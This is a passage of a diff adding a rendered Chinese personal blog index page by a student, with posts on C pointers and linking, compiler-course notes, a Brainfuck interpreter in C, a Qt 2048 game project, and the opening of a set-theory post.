+
+#define X(a,b) a,
+	char *str[] = {COLOR(X)};
+#undef X
+```
+
+怎么说呢，有点像call back function的感觉
+
+# 指针
+
+## 特殊指针
+
+`NULL`指针在C中的定义是`(void *)0`
+
+常量指针`const int *p`或`int const *p`：指向常量的指针(a pointer that points to a const)
+
+指针常量`int *const p`：一个自己是常量的指针(a const pointer)
+
+上面两类还可以复合/套娃....类比就行
+
+
+
+## 指针变量的阅读
+
+具体可以看[这篇文章](https://www.cquestions.com/2009/11/how-to-read-complex-pointers-in-c.html)
+
+# 链接
+
+## 符号表
+
+这里的符号表和编译原理的符号表又不太一样
+
+编译的时候可以多个编译单元编译成`.o`文件，最后合并成一个可执行文件(elf)，这个合并的过程就是链接
+
+在链接的时候，需要维护一些跨编译单元的1. 函数调用2. 全局变量引用，**符号表**就是用来给链接器提供这个信息的
+
+根据这个角度，就可以知道为什么局部变量和宏不会出现在符号表中了，因为它们在链接时1. 不会被引用和修改 2. 已经被展开了
+
+## `static`和`inline`
+
+`inline`表示建议编译器内联这段函数，但仅含有`inline`的函数定义不是一个函数声明，因此不会出现在符号表中
+
+在GCC开启-O0级别优化的时候，就会出错
+
+所以有两种方法解决：
+
+1. 在`inline`定义后加一个函数声明
+2. 在`inline`关键字前加`static`关键字
+
+
+
+而对于仅含有`static`的函数，如果它未被调用，则开启`-Wall`和`-Werror`的时候就会报Function defined but not used错，这是因为`static`函数只可能被当前`.c`文件调用，而查手册可以发现`-Wunused-function`恰好会指出这种情况。解决的方法可以是用`static inline`代替`static`，或者删掉这个函数定义和声明
+
+# 杂项
+
+## 编译器选项
+
+感觉`-Wall`那个应该放这里的
+
+64位下，对于开启`-O1`及以上优化级别的程序，截止当前版本的GCC默认会省略`%rbp`寄存器的保存（压栈、记录栈顶），这样既可以变快，又可以多一个通用寄存器。在做ICS Labs的时候要写一个自己的`setjmp()`和`longjmp()`，然后我就卡在了获得`ret`地址这一步，原因就是这个东西破坏了调用规定，导致栈的行为不确定了....
+
+解决方法很简单，直接自己写一整个的函数，而不是在函数内部内联汇编，这样callee就是自己维护的了，想怎么做就怎么做
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/27/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/26/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E7%AC%94%E8%AE%B01-Introduction/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/12/26/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E7%AC%94%E8%AE%B01-Introduction/" class="post-title-link" itemprop="url">编译原理 笔记1 Introduction</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-12-26 23:42:00" itemprop="dateCreated datePublished" datetime="2020-12-26T23:42:00+08:00">2020-12-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          看的是英文版的龙书,各种翻译看看就好...
+
+大概前半段是课本，后半段是网课的笔记。因为课程好像都不讲Chap. 2，所以下一节的笔记大概就没有课堂内容了
+
+# 1.1 Language Processors
+
+词汇:
+intermediate 中间的
+compile 编译
+interpret 解释
+assemble 汇编
+relocatable 可重定位的
+
+编译器指的是将源代码翻译成等价的另一种语言的程序的程序(饶舌)
+编译器的一项重要职责是检测error
+编译语言的编译和执行是分开的:
+
+1. 源代码->[编译]->程序
+2. 输入->[执行程序]->输出
+
+解释器是另一种语言处理器,解释语言没有编译过程:
+
+1. 源代码+输入->[解释]->输出
+
+通常来讲编译器要比解释器快得多(显然)
+而解释器通常能更好的检测error(解释器一步步执行)
+
+Java语言结合了翻译(Translate)和解释(Interpret):
+
+1. 源代码->[翻译]->字节码(bytecode)
+2. 字节码+输入->[虚拟机]->输出
+   这里的字节码是一种中间程序(intermediate program),其好处在于可以在编译后跨平台解释
+   有些java编译器直接把字节码翻译成机器语言来加速
+
+从源代码到可执行文件之间不止需要编译器一个程序(过程)
+源代码(source code)->[预处理器(preprocessor)]->修改过的源代码(modified sourcecode)->[**编译器(compiler)**]->汇编语言(assembly program)->[汇编(assembler)]->可重定位机器码(relocatable machine code)->[链接(Linker/Loader)]->目标机器码(target machine code)
+
+通常情况下源代码有多个,它们先被**预处理器**处理(宏展开 代码替换等)得到修改过的源代码
+修改过的源代码然后被给了编译器,编译后得到汇编程序(较抽象 方便调试)
+汇编程序传给汇编器后得到relocatable machine code.编译过程中可能会有多个源代码,这时候就要把它们(还有一些需要的部分)链接起来,最后才得到可执行的程序(executable program)
+
+## Exercise for 1.1
+
+1. 编译器和解释器的区别？
+   笔记里有
+2. 编译器和解释器的优劣？
+   笔记里有
+3. 编译器为什么产生汇编程序而不直接得到机器语言？
+   1. Assembly language is easier to produce as output
+   2. It is easier to debug (there may be more than one source codes)
+4. 把一种高级语言翻译成另一种高级语言的的编译器叫做“source-to-source translator”.那么用C作为目标语言的编译器有什么好处？
+   C语言比较通用、易于阅读(compared to other intermediate languages)...C语言的优势都算
+5. 描述一下assembler的任务
+   笔记里有
+
+# 1.2 The Structure of a Compiler
+
+词汇:
+grammar 语法
+lexical 词法的
+syntax syntactical 句法 句法的
+semantic 语义的
+synthesis 合成
+constituent 组成的
+impose 施加
+sound 合理的
+coercions 强制类型转换
+judicious 明智的
+phase 阶段
+pass 通路
+syntax-directed translation
+
+前面讲了整个编译的过程,后面主要讲Compiler这一部分
+编译可以分成两个部分:分析(Analysis)和合成(Synthesis)
+
+## Analysis:
+
+compiler的**前端**(front end)
+把源代码分解成若干小部分,再用这些部分构建语法结构,并利用语法结构来建立一种中间表达(Intermediate Representation = IR)
+如果Analysis过程中检测到了error(语法错误、语义错误)compiler能够及时报错
+同时Analysis过程中compiler会收集一些信息储存在symbol table(一种数据结构)中,并连同IR一起传递给Synthesis过程
+
+##　Synthesis:
+
+compiler的**后端**(back end)
+接收IR和symbol table,并据此产生目标程序
+
+compiler的流程一套下来大概是这样的:
+characters->[lexical analysis]()->tokens->[syntax analysis]()->syntax tree(语法树)->[semantic analysis]()->decorated syntax tree->[Intermediate code generator]()->IR->[optimizer1]()->IR->[code generator]()->machine code->[optimizer2]()->machine code
+其中symbol table全程在线,随时可用
+流程里的optimizer不一定都有,不一定没有,都属于可选项
+
+### Lexical Analysis
+
+这是compiler的第一部分,这个部分compiler会读取字符流中的字符,然后得到若干词语(lexeme)组成的序列
+每个lexeme都可以表示为形式如下的token:
+<token-name, value>
+
+书中举了这样一个例子:
+
+```cpp
+position = initial + rate * 60;
+```
+
+就会被翻译成类似
+
+```cpp
+<id, 1> <=> <id, 2> <+> <id, 3> <*> <num, 60>
+```
+
+这样的语句.此时symbol table就会变成这个样子
+
+```cpp
+1 position 20
+2 initial 12
+3 rate 0.25
+```
+
+我们看到的
+
+```cpp
+<id, x>
+```
+
+就可以理解成从symbol table中的第x个元素,其余的类似(如果学过汇编可能会理解得好一点)
+
+如果出现了无法识别的字符/词语,那么编译器就会报错
+否则Lexical Analysis就会把若干这样的tokens传递给下一个环节
+
+### Syntax Analysis/Parsing
+
+在这一环节parser会利用前面的tokens建立一个树形结构来表示语法结构
+一个例子是语法树(syntax tree).语法树的每一个节点都代表一个操作(operator),节点的儿子是操作的对象.
+语法树的结构有利于维持传统运算的优先级顺序,也就是说它直观上是很好理解的
+
+### Semantic Analysis
+
+这一环节semantic analyzer会根据语言的规范，利用语法树和symbol table中的信息来检查源代码的语义.一个具体的检查例子就是typecheck
+有的时候语言还有隐式的类型转换，这种时候compiler就需要判断出转换的类型，一个简单的例子是(int x = 60.0 * 2;)
+同时，这一阶段还会收集变量的类型等各种信息用于后续过程
+
+### IR Generation
+
+在编译过程中可能出现不止一种、不止一次IR，语法树只是其中常用的一种
+在词法分析、语法分析、语义分析后，compiler通常会产生一种特殊的IR
+它较低级(low-level)，靠近机器语言(machine-like)，所以
+
+1. 容易生成
+2. 容易翻译成目标机器语言
+
+
+#### 3AC
+
+3AC(3-adress code)是IR一个例子 (这个东西的形式很像寄存器的各种操作，通常有各种中间变量)
+一条常见的3AC指令形如: A = B opt C
+
+1. 至多一个操作符(可以没有:赋值操作)，**至多**两个操作变量
+2. 所有操作按固定顺序执行
+
+### Opimization
+
+喜闻乐见的优化环节
+优化分两种，机器无关(machine dependent)/机器相关(machine independent)，通常指的是运行速度优化
+优化还可能包括(更少的能耗/更小的程序)
+
+对IR的优化属于机器无关的优化(为什么?)，其意图在于减少语句的同时保证所有的语句仍然符合IR规范
+
+现代编译器的区别主要在于optimization环节，致力于optimization的compiler被称为"optimizing compilers"
+
+### Code Generation
+
+这个环节compiler将IR转变为机器代码(直接操作寄存器、内存)的序列
+这一步的重点在于明智地分配寄存器和高效代码的生成
+本书到目前为止忽略了identifier(变量)的储存分配，现在只需要知道这在生成IR的环节或这一环节完成就行
+
+### Symbol Table Management
+
+这个数据结构记录了变量、变量类型、使用位置、函数等等信息，并且应该支持快速的查找和修改各种信息
+(怎么看怎么像BST囧,哪来的table)
+
+### Grouping Phases into Passes
+
+一个流程的各逻辑阶段叫做Phases。在实际操作中可能会把多个Phases同时实现(例如同时实现词法和语法分析)
+
+一个读入一段文件并输出一段文件的流程叫做Pass，是流程的实际阶段分割
+
+这一段讲的是compiler的组织结构和模块化
+在上面把compiler分为front end和back end的好处在于
+
+1. 可以用一个语言的前端配上不同机器的后端
+2. 可以用不同语言的前端配上特定机器的后端
+
+
+
+## 语言发展史
+
+机器语言->汇编->Fortran、Cobol、Lisp、C、C++->NOMAD、SQL、Postscript->Prolog、OPS5
+
+
+
+一些概念(哪哪都是这几位)
+
+### 命令式语言(Imperative)
+
+描述操作过程的语言
+
+### 声明式语言(Declarative)
+
+描述操作目的的语言
+
+### 冯诺依曼语言
+
+所有以冯诺依曼体系结构为基础的语言都是。基于lambda验算的语言则不是
+
+### 脚本语言
+
+逐行执行，无需全文编译即可运行的语言
+
+
+
+## Name&Variable&Identifier
+
+Identifier是一段字符，用来表示某个实体(entity)
+
+Name指的是**代码**中的某个静态实体，可以是函数/变量/其它。所有的Id都是Name，但Name不都是Id(例如Id.Id也可以表示一个Name)
+
+Variable用来指代运行时Name的动态含义(某个Name究竟指内存中的哪段数据)。
+
+
+
+## 静态/动态
+
+如果一个问题需要运行程序才能得到答案，那么这个问题就是"动态的"，否则是"静态的"
+
+一个经典的问题就是静态/动态的作用域。作用域设计的问题是：在某处提及的Name `x`究竟是在何处被声明的 `x`？
+
+静态的作用域很好理解；动态作用域的一个例子出现在OOP中。例如对于父类和子类都实现了的方法`method()`，`x.method();`究竟dispatch到哪一个，就依赖于`x`动态指向的对象。
+
+
+
+## Environment&State
+
+环境：从Name到储存位置的映射(左值)
+
+状态：从储存位置到值的映射(右值)
+
+那么上面说到的"OOP中函数的作用域由环境决定"的说法就可以理解了，即类中函数的作用域由receiver object在储存中的位置决定。
+
+
+
+从这个角度看，Allocation Site Abstraction就是在用Name对Variable建模
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/26/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E7%AC%94%E8%AE%B01-Introduction/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/25/BF%E8%A7%A3%E9%87%8A%E5%99%A8%E5%92%8C%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8E%E5%A4%9A%E6%96%87%E4%BB%B6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/12/25/BF%E8%A7%A3%E9%87%8A%E5%99%A8%E5%92%8C%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8E%E5%A4%9A%E6%96%87%E4%BB%B6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/" class="post-title-link" itemprop="url">BF解释器和几个小程序以及关于多文件编程的理解</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-12-25 23:26:00" itemprop="dateCreated datePublished" datetime="2020-12-25T23:26:00+08:00">2020-12-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          上SICP的时候樾哥提到了一个叫图灵完备的概念，啥是图灵完备呢？简单说就是能模拟图灵机的所有操作的语言就可以说是图灵完备的，它的计算能力和图灵机至少是等价的
+然后有这么一个很小的语言Brainfuck，它有一个类似射线的有格纸带，一个可以任意移动的指针
+规定，"<"、">"、","、"."、"+"、"-"分别表示左移、右移、读入、输出、增加1、减少1，这个做起来是很简单的
+然后是"["和"]"，其等价于 while (pointer->value != 0) {do sth...}
+要实现这个操作只需要用一个栈记录所有的左括号就可以了。纸带等价于一个双向链表，这些都不是很难写。
+
+特意用C写了这个东西的解释器，把自己实现的stack和list放在了两个.h文件里，学到很多.jpg
+~~关于.h文件的用法还没有很好的掌握，这里先不管了…~~
+
+在oi中，我们通常只能提交一个源代码文件，因此多文件编程并不是必须的(或者说是必须禁止的)
+然而在实际生产生活中，我们不可能写一个长达几千行的源文件。首先这对代码能力有很高的要求，其次这阻止了多人协作/同时工作，最后只有一个源文件意味着每次修改都要重新完整地编译
+一个解决的方案比把过程分为函数更彻底，我们把一个程序分成若干部分。例如本项目里就可以把stack和list的实现分离出去，这样也有利于代码以后复用
+
+.h文件和.c文件在项目中承担的角色不一样：.c文件主要负责实现，也就是定义函数；.h文件主要负责声明，比如函数声明、宏定义等。这些不是C语法规定的内容，而是约定成俗的规范
+
+下面是关于.h头文件的事实标准：
+    可以声明函数，但不可以定义函数。
+    可以声明常量，但不可以定义变量。
+    可以“定义”一个宏函数。注意：宏函数很像函数，但却不是函数。其实还是一个声明。
+    结构的定义、自定义数据类型一般也放在头文件中。
+    除了主文件（有 main() 函数的文件），其他的 .c 文件一般只定义函数，并向外暴露（可以使用 extern，也可以不使用）。
+    可以将一个或多个相关的函数定义在一个 .c 文件。
+
+上面的内容摘自[C语言模块化编程 chunlanse2014](https://www.cnblogs.com/chunlanse2014/articles/4423281.html)
+
+个人的理解是，.h文件只负责提供接口的作用，而接口两端的物品在编译时是各自独立的
+
+
+这里附赠几个个小程序，有一些是自己写的，可能有更好的写法
+```c
+
+// ,>,[-<+>] // a plus b
+// ,>,[-<->] // a minus b
+// ,>>,<<[->>[-<+>>+<]>[-<+>]<<<]>. //a times b
+// ++++++++++[>+++++++>++++++++++>+++>+<<<<-]>++.>+.+++++++..+++.>++.<<+++++++++++++++.>.+++.------.--------.>+.>. // Hello World!
+
+
+// BFcompiler.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include "stack.h"
+#include "list.h"
+
+#define MAX_LENGTH 200005
+
+char seq[MAX_LENGTH];
+
+int FindNextPos(char *s, int pos) {
+	for (; s[pos] != ']'; ) pos ++;
+	return pos;
+}
+
+int main(void) {
+	scanf("%s", seq);
+	int len = strlen(seq);
+	Node* current_pointer = (Node*) malloc(sizeof(Node));
+	NodeInit(current_pointer);
+	Stack* stack = (Stack*) malloc(sizeof(Stack));
+	StackInit(stack);
+	for (int i = 0; i < len; ++ i) {
+		switch (seq[i]) {
+			case '+': {
+				add(current_pointer, 1);
+				break;
+			}
+			case '-': {
+				add(current_pointer, -1);
+				break;
+			}
+			case '>': {
+				moveRight(&current_pointer);
+				break;
+			}
+			case '<': {
+				moveLeft(&current_pointer);
+				break;
+			}
+			case ',': {
+				scanf("%d", &(current_pointer->value));
+				break;
+			}
+			case '.': {
+				printf("%c", current_pointer->value);
+				break;
+			}
+			case '[': {
+				if (current_pointer->value != 0) {
+					StackPush(stack, i);
+				} else {
+					i = FindNextPos(seq, i);
+				}
+				break;
+			}
+			case ']': {
+				if (current_pointer->value != 0) {
+					i = StackTop(stack);
+				} else {
+					StackPop(stack);
+				}
+				break;
+			}
+		}
+	}
+	return 0;
+}
+
+
+
+// stack.h
+#ifndef STACK_HEADER_FILE
+#define STACK_HEADER_FILE
+
+#define INF 0x3f3f3f3f
+
+typedef struct tmpStackNode {
+	struct tmpStackNode *next;
+	int value;
+} StackNode;
+
+typedef struct {
+	StackNode *top;
+	int size;
+} Stack;
+
+void StackNodeInit(StackNode *p);
+
+void StackInit(Stack *stack);
+
+void StackPush(Stack *stack, int value);
+
+void StackPop(Stack *stack);
+
+int StackTop(Stack *stack);
+
+#endif
+
+
+//stack.c
+#include <stddef.h>
+#include <stdlib.h>
+#include "stack.h"
+
+void StackNodeInit(StackNode *p) {
+	p->next = NULL;
+	p->value = 0;
+}
+
+void StackInit(Stack *stack) {
+	stack->top = (StackNode*) malloc(sizeof(StackNode*));
+	StackNodeInit(stack->top);
+	stack->size = 0;
+}
+
+void StackPush(Stack *stack, int value) {
+	StackNode *tmp = (StackNode*) malloc(sizeof(StackNode));
+	StackNodeInit(tmp);
+	tmp->value = value;
+	tmp->next = stack->top;
+	stack->top = tmp;
+	stack->size += 1;
+}
+
+void StackPop(Stack *stack) {
+	if (stack->size < 1) return ;
+	StackNode *tmp = stack->top;
+	stack->top = stack->top->next;
+	stack->size -= 1;
+	free(tmp);
+	tmp = NULL;
+}
+
+int StackTop(Stack *stack) {
+	if (stack->size < 1) return INF;
+	return stack->top->value;
+}
+
+
+// list.h
+#ifndef LIST_HEADER_FILE
+#define LIST_HEADER_FILE
+
+typedef struct tmpNode {
+	struct tmpNode *next, *prev;
+	int value;
+} Node;
+
+void NodeInit(Node *p);
+
+void add(Node *p, int value);
+
+void moveLeft(Node **p);
+
+void moveRight(Node **p);
+
+#endif
+
+//list.c
+#include <stddef.h>
+#include <stdlib.h>
+#include "list.h"
+
+void NodeInit(Node *p) {
+	p->next = p->prev = NULL;
+	p->value = 0;
+}
+
+void add(Node *p, int value) {
+	p->value += value;
+}
+
+void moveLeft(Node **p) {
+	if ((*p)->prev == NULL) return ;
+	(*p) = (*p)->prev;
+}
+
+void moveRight(Node **p) {
+	if ((*p)->next == NULL) {
+		(*p)->next = (Node*) malloc(sizeof(Node));
+		NodeInit((*p)->next);
+		(*p)->next->prev = (*p);
+	}
+	(*p) = (*p)->next;
+}
+```
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/25/BF%E8%A7%A3%E9%87%8A%E5%99%A8%E5%92%8C%E5%87%A0%E4%B8%AA%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%BB%A5%E5%8F%8A%E5%85%B3%E4%BA%8E%E5%A4%9A%E6%96%87%E4%BB%B6%E7%BC%96%E7%A8%8B%E7%9A%84%E7%90%86%E8%A7%A3/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/15/%E6%9C%9F%E6%9C%AB%E5%B0%8F%E4%BD%9C%E4%B8%9A%E2%80%94%E2%80%942048%E5%B0%8F%E6%B8%B8%E6%88%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/12/15/%E6%9C%9F%E6%9C%AB%E5%B0%8F%E4%BD%9C%E4%B8%9A%E2%80%94%E2%80%942048%E5%B0%8F%E6%B8%B8%E6%88%8F/" class="post-title-link" itemprop="url">期末小作业——2048小游戏</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-12-15 21:05:00" itemprop="dateCreated datePublished" datetime="2020-12-15T21:05:00+08:00">2020-12-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          ## 写在前面
+---
+程设期末没考试，但是要做一个2048游戏的小作业
+虽然tw老湿并没有作出格外的要求，但我还是上了QT写了图形化的界面（虽然写的很丑）
+这里并没有用上signal和slot之类的特性，因为暂时还用不上。。希望后面能发现更好的写法
+
+在上了半个学期的SICP(实验课)之后体会到了python里变量和指针各自的好处，于是现在更喜欢指针和变量分的比较开的cpp了。这是第一次主要使用指针和各种类的cpp programming，感觉写完一遍下来对cpp的理解有了一点变化，面向对象还挺有意思的。
+
+由于是第一次写比较大规模的project，其中的一些（很多）地方会有不妥之处，可能（大概率）还会有各种指针方面的隐患，但是这个project是能跑的，暂时我就不管了。回去看一下樾哥的软件分析再看看怎么说，毕竟现在还算没有很好的正式入门吧
+
+然后就没啥好说的了，还不会用git但是已经感受到了大project版本控制的重要性，在学了.jpg
+
+### 官方要求
+---
+1. 实现2048游戏的基本操作（上下左右，合并规则，合并顺序，随机新方块）
+2. 显示得分
+3. 回退操作（留坑待填）
+4. 存档/读档操作
+5. 输判断
+
+### 我的额外实现
+---
+1. 图形化界面
+2. 方向键控制
+3. （并不）流畅的动画
+4. OOP
+5. 方块颜色
+
+## 设计构思
+---
+当前游戏状态表示为一个GameState类的实例，用一个N*N的棋盘指向方块
+移动比较简单，合并的时候可以拆分成：移动->合并相邻->移动的操作
+
+得分也没啥好说的，合并的时候算就可以了
+
+回退在非GUI的版本是用stack记录历史版本的指针，当前局面都是一个指向新局面的指针
+这里需要说一下复制函数。如果类中存在指针，那么在复制类的实例时默认的复制函数只会复制指针而不会复制指针指向的内存空间。而在这里我们如果使用默认的复制函数则只会得到若干个指向实际上是同一个局面的内存空间的指针，所以需要重写一下复制函数。**这一点在GUI版本中还没有做**
+
+存档和读档刚写完。具体而言就是把每个格子里的数字和总分通过文件储存就完事了。这里唯一的新东西就是fstream读写文件，细节可以看代码，没有什么难度
+
+输赢的判断也很简单，放在分数更新之后就可以了。这里用到了QMessageBox做一个小的弹窗，实现也只要看代码就可以理解，无难度
+
+图形化界面这里选择了QT，因为同班的朋友（卷友）选择的也是这个，处于好交流方便抱大腿的目的，我也选了这个路子。据说还有EasyX这样的选择，大家也可以去试试（我还没试过）
+每个Tile都是一个PushButton，因为这个看起来最像原游戏的设定...
+
+动画用的则是QT里的QPropertyAnimation，具体使用方法可以看代码。每一段动画都是new出来的一个实例，在delete的时候要小心对付。
+
+早期（指今天以前）就有了动画的实现，但是因为我选择了“移动->合并->移动”的路线，所以Tile在动画完成之前就已经被delete了，使得合并的方块就没有动画效果。后面想了很久发现用一个Queue储存被合并了的Tile，在跑完动画之后再延迟删除就可以实现比较好的动画效果。这里可能是写得最久的地方，而且现在动画也有点怪怪的，不知道还有没有更优雅的实现...
+
+关于OOP，这里总共就涉及到了两个类，分别是游戏状态和每个小方块。因为之前做过SICP的Ants的project，因此这里也就照葫芦画瓢
+
+最后还做了一个方块颜色渐变的设计，随着数字增大方块灰度会逐渐加深，目前上限是8192,因为再大就显示不全了...
+
+然后就没啥好讲的了
+
+## 代码
+---
+丢在github上了，可以看[这里](https://github.com/olahiuj/Project_2048)
+[https://github.com/olahiuj/Project_2048](https://github.com/olahiuj/Project_2048)
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/12/15/%E6%9C%9F%E6%9C%AB%E5%B0%8F%E4%BD%9C%E4%B8%9A%E2%80%94%E2%80%942048%E5%B0%8F%E6%B8%B8%E6%88%8F/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/23/%E5%87%A0%E4%B8%AA%E5%85%B3%E4%BA%8E%E9%9B%86%E5%90%88%E7%9A%84%E6%9C%89%E8%B6%A3%E8%AF%81%E6%98%8E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="jpwang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jjppp">
+      <meta itemprop="description" content="Young, Simple & Naive">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | jjppp">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2020/11/23/%E5%87%A0%E4%B8%AA%E5%85%B3%E4%BA%8E%E9%9B%86%E5%90%88%E7%9A%84%E6%9C%89%E8%B6%A3%E8%AF%81%E6%98%8E/" class="post-title-link" itemprop="url">几个关于集合的有趣证明</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-23 11:37:00" itemprop="dateCreated datePublished" datetime="2020-11-23T11:37:00+08:00">2020-11-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-06-19 09:36:58" itemprop="dateModified" datetime="2022-06-19T09:36:58+08:00">2022-06-19</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          在离散数学的第一堂课就被介绍了Set和Proper Class的区别。
